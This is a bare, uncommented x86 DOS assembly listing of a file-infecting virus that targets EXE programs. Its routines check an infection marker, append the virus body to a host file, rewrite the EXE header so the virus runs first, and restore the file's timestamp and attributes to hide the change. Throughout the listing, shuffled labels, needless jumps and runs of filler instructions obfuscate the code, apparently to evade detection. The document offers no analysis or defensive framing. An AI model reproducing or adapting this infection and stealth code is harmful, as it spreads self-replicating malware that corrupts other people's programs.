QWEXJ:
		call 	 EQPMC
WLBKK:
		call 	 T_MHE
OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		JMP 	WLBKK
T_MHE:
JNZ EQPMC
JMP QWEXJ
EQPMC:
		 mov ah,’Z’
JZ _S_VU
JMP __URP
_S_VU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
__URP:
		call 	 _S_VU
	     ret 


GET_EXE_HEADER:
		JMP 	YOJCQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YOJCQ:
	 mov dx,OFFSET USEFILE
JZ NWCTB
JMP PDSDX
NWCTB:
	 mov ax,3D02H 
		JMP 	RCODN
HEGBP:
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
		cmp 	ax,ax
JZ VAKWK
JMP LVSQJ
VAKWK:
	 mov ah,3FH
	 int 21H

RE_RET: ret 
PDSDX:
		call 	 NWCTB
ORKHF:
		call 	 LYBHX
RCODN:
LVSQJ:
		call 	 VAKWK
		call 	 HEGBP
DCWKB:
		call 	 _BLXA


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
		JMP 	ZCJTE
ERJBZ:
JZ _BLXA
JMP DCWKB
_BLXA:
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
ZCJTE:
		call 	 ERJBZ
	 cmp ax,4*NUMRELS 

RR_RET: ret     
XRYFN:
		call 	 MCSER
UNZQI:
		call 	 AFABZ


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
JZ MCSER
JMP XRYFN
MCSER:
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
JZ LYBHX
JMP ORKHF
LYBHX:
	 mul dx
	 mov cx,dx
	 mov dx,ax 
JZ AFABZ
JMP UNZQI
AFABZ:
		JMP 	SLHML
cmp cx,dx
SLHML:
	 mov bx,[HANDLE]
		JMP 	ZPMNH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZPMNH:
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
		JMP 	JWZNL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
JWZNL:
		JMP 	UADXD
cmp ax,bx
cmp ax,bx
UADXD:
	 mov bx,[HANDLE]
WLQOT:
	 mov dx,OFFSET VIDC
		cmp 	ax,ax
JNZ WPFYG
JMP WJQSM
WPFYG:
	 mov cx,2 
JNZ NUJPU
JMP _TRNT
NUJPU:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
		JMP 	RIVB_
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
RIVB_:
	 mov ax,[VIDC]
		cmp 	bx,bx
JNZ CXYJH
JMP VZNQS
CXYJH:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
_TRNT:
		call 	 NUJPU
_ZFJM:
		call 	 QDYSD
WJQSM:
		call 	 WPFYG
VZNQS:
		call 	 CXYJH
	 stc 

II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
		JMP 	NLDGP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
NLDGP:
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
JNZ QDYSD
JMP _ZFJM
QDYSD:
	 int 21H

SB_E: ret


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
		JMP 	NDSOS
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
NDSOS:
	 mov bx,0
EV_XV:
	 adc cx,bx 
	 mov bx,[HANDLE]
		JMP 	TUHDL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TUHDL:
	 mov ax,4200H 
QDJRB:
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
TGYHH:
	 mov cx,2
AHDIC:
EYXGU:
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
		JMP 	UG_SY
xor bx,cx
xor bx,cx
xor bx,cx
UG_SY:
	 mov cx,WORD PTR [FSIZE+2]
		JMP 	GTTIP
xor bx,cx
xor bx,cx
GTTIP:
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
		JMP 	FM_DL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FM_DL:
	 mov bx,0
UTRKK:
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
KCFRD:
TXLOP:
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
BNIPI:
FIEPP:
	 mov cx,WORD PTR [FSIZE+2]
XNBJG:
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
BMUGD:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
VGDWT:
	 mov bx,[HANDLE]
	 mov cx,4
AXRUJ:
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
		JMP 	EEYKA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
EEYKA:
	 mov bx,WORD PTR [FSIZE+2]
XFGGV:
	 and bl,0FH
	 mov cl,4
QLQKF:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
YFENY:
PUMUU:
JVNEJ:
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
		JMP 	WPUVH
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WPUVH:
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
		JMP 	RSGAL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RSGAL:
	 mov ax,STACKSIZE 
LQOWK:
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
GQXSZ:
		JMP 	OCXPU
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OCXPU:
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
KOL_I:
QOADT:
FYNGI:
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
J_A_X:
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
XFOAO:
DYUOY:
	 mov ax,NUMRELS 
DXZZJ:
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
GJJNG:
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
UVZJV:
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
MJWAT:
	 dec ax 
	 dec ax 
		JMP 	_XCSD
nop
nop
nop
nop
nop
nop
nop
_XCSD:
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
		JMP 	KEUPM
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KEUPM:
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
BEVGT:
	 mov dx,ax
TSRWE:
NU_LE:
	 mov bx,[HANDLE]
XDVMR:
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
		JMP 	_UDOA
nop
nop
nop
nop
nop
nop
nop
_UDOA:
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
		JMP 	QWLQX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QWLQX:
	 mov WORD PTR [EXE_HDR+2],ax 
_OQMD:
WHSZU:
	 mov ax,WORD PTR [EXE_HDR+22]
UEXHK:
JZ ITIPY
JMP IKXSV
ITIPY:
	 mov bx,OFFSET REL2
JNZ R_UUI
JMP CKKCU
R_UUI:
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
		JMP 	W_QHI
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
W_QHI:
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
		cmp 	ax,dx
JZ XHROY
JMP HEHJQ
XHROY:
		JMP 	ZLGOR
RZOUH:
JNZ OIRWR
JMP JITYO
OIRWR:
	 mov ah,40H 
	 int 21H
ENMRB:
		call 	 ZSGUS
IKXSV:
		call 	 ITIPY
	 ret 

JITYO:
HEHJQ:
		call 	 XHROY
		call 	 OIRWR


CKKCU:
		call 	 R_UUI
TIMECT EQU 63 
ZLGOR:
		call 	 RZOUH


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;
CQIYQ:
		call 	 TGZPF



SETSR:
	 mov al,90H 
JNZ TGZPF
JMP CQIYQ
TGZPF:
JNZ ZSGUS
JMP ENMRB
ZSGUS:
	 mov BYTE PTR SR1,al 
	 ret
NBXKU:
		call 	 BWIPW


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
JNZ YTWDM
JMP KFICM
YTWDM:
	 mov ah,1AH
	 int 21H 
KFICM:
		call 	 YTWDM
ZL_UQ:
		call 	 PXRTK
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
JNZ PXRTK
JMP ZL_UQ
PXRTK:
JZ BWIPW
JMP NBXKU
BWIPW:
	 mov ds,ax
	 mov ah,1AH
JZ KPYMD
JMP NMADE
KPYMD:
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
BUSQT:
		call 	 DRSPI
YSYFF:
		call 	 _EYG_
BMMUB:
		call 	 TEJXK
QKBGR:
		call 	 MURRJ
NMADE:
		call 	 KPYMD
TNTJW:
		call 	 _JHIB
HNQYY:
		call 	 FOOLF
PAPTQ:
		call 	 _GDNG
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
		JMP 	HNQYY
FOOLF:
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
		JMP 	BUSQT
DRSPI:
	 int 21H
	 mov [HANDLE],ax 
		JMP 	PAPTQ
_GDNG:
		JMP 	TNTJW
_JHIB:
		JMP 	QKBGR
MURRJ:
JNZ TEJXK
JMP BMMUB
TEJXK:
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
JNZ _EYG_
JMP YSYFF
_EYG_:
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
		JMP 	OQLFL
WTDJK:
	 mov ax,WORD PTR [DTA1+28] 
		JMP 	GPNSU
HLYTS:
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
JNZ TYDAJ
JMP JGVJU
TYDAJ:
	 mov WORD PTR [FSIZE],ax
 	 ret
OQLFL:
		call 	 WTDJK
GPNSU:
JGVJU:
		call 	 TYDAJ
WMAUF:
		call 	 GWCGH
		call 	 HLYTS

IOGEA:
HXVOP:
		call 	 SZNST
		call 	 XGB_T


REST_ATTRIBUTE:
	 mov dx,[FDATE] 
JNZ GWCGH
JMP WMAUF
GWCGH:
	 mov cx,[FTIME]
JNZ XGB_T
JMP IOGEA
XGB_T:
		JMP 	_GFYI
cmp cx,dx
_GFYI:
	 mov ah,57H 
	 mov al,1
JZ SZNST
JMP HXVOP
SZNST:
		JMP 	BDMZI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
BDMZI:
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
	 mov bx,[HANDLE]
		cmp 	ax,cx
JZ MCCKU
JMP _CHTV
MCCKU:
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
		JMP 	ZOHWG
nop
nop
nop
nop
nop
ZOHWG:
	 mov ah,43H 
		JMP 	ZBOGC
xor bx,cx
xor bx,cx
xor bx,cx
ZBOGC:
	 mov al,1
JZ GJEDE
JMP EWLLL
GJEDE:
	 mov dx,OFFSET USEFILE
	 int 21H
EWLLL:
		call 	 GJEDE
_CHTV:
		call 	 MCCKU
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
